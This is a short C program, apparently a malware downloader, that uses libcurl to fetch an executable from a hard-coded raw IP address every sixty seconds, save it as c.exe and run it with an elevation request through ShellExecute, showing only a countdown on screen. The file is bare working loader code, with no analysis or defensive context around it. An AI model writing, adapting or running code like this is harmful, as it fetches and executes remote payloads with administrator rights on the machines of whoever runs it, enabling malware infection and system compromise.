#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>

static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
{
	size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
	return written;
}

void http_get(char *url, char *filename)
{
	CURL *curl_handle;
	FILE *f;

	curl_global_init(CURL_GLOBAL_ALL);

	curl_handle = curl_easy_init();

	curl_easy_setopt(curl_handle, CURLOPT_URL, url);
	curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 1L);
	curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
	curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);

	f = fopen(filename, "wb");
	if(f)
	{
		curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, f);
		curl_easy_perform(curl_handle);
		fclose(f);
	}

	curl_easy_cleanup(curl_handle);
	curl_global_cleanup();
}

int main()
{
	int n = 3;
	while(1)
	{
		if (n == 0)
		{
			printf("\n");
			http_get("http://114.67.253.14/temp/c.exe", "c.exe");
			ShellExecute(0, "runas", "c.exe", "", "", SW_NORMAL);
			n = 60;
		}
		printf("%d", n);
		Sleep(1000);
		n--;
	}
	return 0;
}
